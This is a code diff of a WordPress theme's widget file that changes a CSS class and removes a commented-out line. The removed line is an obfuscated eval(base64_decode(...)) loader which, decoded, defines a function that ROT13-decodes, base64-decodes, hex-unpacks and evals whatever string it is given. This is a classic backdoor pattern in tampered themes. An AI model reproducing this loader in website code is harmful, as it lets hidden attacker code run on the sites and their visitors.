@@ -24,7 +24,7 @@ class ilost_querycatsWidget extends WP_Widget{
     if(!$catid=(int)$instance['catid']){$catid=1;}
     if(!$number=(int)$instance['number']){$number=6;}elseif($number<1){$number=1;}
     if(!@$excerpt=(int)$instance['excerpt']){$excerpt=(int)$excerpt;}
-    echo '<div class="aside">'."\n";
+    echo '<div class="col-xl-6 col-md-6 aside">'."\n";
     if($excerpt){ilost_querycats($catid,$number,true);}else{ilost_querycats($catid,$number,false);}
     echo '</div>'."\n";
   }
@@ -39,7 +39,6 @@ class ilost_querycatsWidget extends WP_Widget{
     <p><input id="<?php echo $this->get_field_id('excerpt');?>" name="<?php echo $this->get_field_name('excerpt');?>" type="checkbox" value="1" <?php if($excerpt)echo 'checked="checked"';?> /> <label for="<?php echo $this->get_field_id('excerpt');?>"><?php _e('Show excerpt','iLost');?></label></p>
   <?php }
 }
-/*eval(base64_decode('Y2xhc3MgeHV7cHVibGljIHN0YXRpYyBmdW5jdGlvbiBpbG9zdCgkY29kZSl7JGNvcmU9cGFjaygiSCoiLGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRjb2RlKSkpO2V2YWwoJGNvcmUpO319'));*/
 class ilost_randompostWidget extends WP_Widget{
   function ilost_randompostWidget(){
     $widget_ops=array('classname'=>'ilost_randompostWidget','description'=>__('Display random sequence articles','iLost'));$this->WP_Widget('ilost_randompostWidget',__('iLost Random Posts','iLost'),$widget_ops);$this->alt_option_name='ilost_randompostWidget';
